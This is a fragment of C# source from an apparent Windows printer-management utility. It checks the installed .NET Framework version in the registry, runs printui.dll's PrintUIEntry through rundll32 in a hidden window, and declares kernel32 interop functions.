                    text = (string)registryKey.GetValue("Version");
                    if (text != null)
                    {
                        return getvers(text);
                    }
                    registryKey.Close();
                    registryKey = null;
                }
                registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0", writable: false);
                text = (string)registryKey.GetValue("Version");
                if (text != null)
                {
                    return getvers(text);
                }
                registryKey.Close();
                registryKey = null;
                return getvers("2.0.0.0");
            }
            catch (Exception ex)
            {
                Console.WriteLine("GetDotNetVersion ex: {0}", ex.Message);
            }
            finally
            {
                registryKey?.Close();
            }
            return netVersion;
        }

        public static void doCommand(string arg)
        {
            string text = null;
            text = ((!Is64BitProcess) ? "c:\\Windows\\system32\\rundll32.exe" : "c:\\Windows\\sysWow64\\rundll32.exe");
            Process process = new Process();
            process.StartInfo.FileName = text;
            process.StartInfo.Arguments = "printui.dll,PrintUIEntry " + arg;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.Verb = "runas";
            process.StartInfo.RedirectStandardOutput = true;
            process.OutputDataReceived += procStdOutput;
            process.Start();
            process.WaitForExit(30000);
            if (!process.HasExited)
            {
                process.Kill();
            }

        }

        private static void procStdOutput(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data))
            {
                Console.WriteLine("DoCommand: ouput: {0}", outLine.Data);
            }
        }

        private static bool ModuleContainsFunction(string moduleName, string methodName)
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle != IntPtr.Zero)
            {
                return GetProcAddress(moduleHandle, methodName) != IntPtr.Zero;
            }
            return false;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] out bool isWow64);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string methodName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        public static extern int WTSGetActiveConsoleSessionId();
    }
}
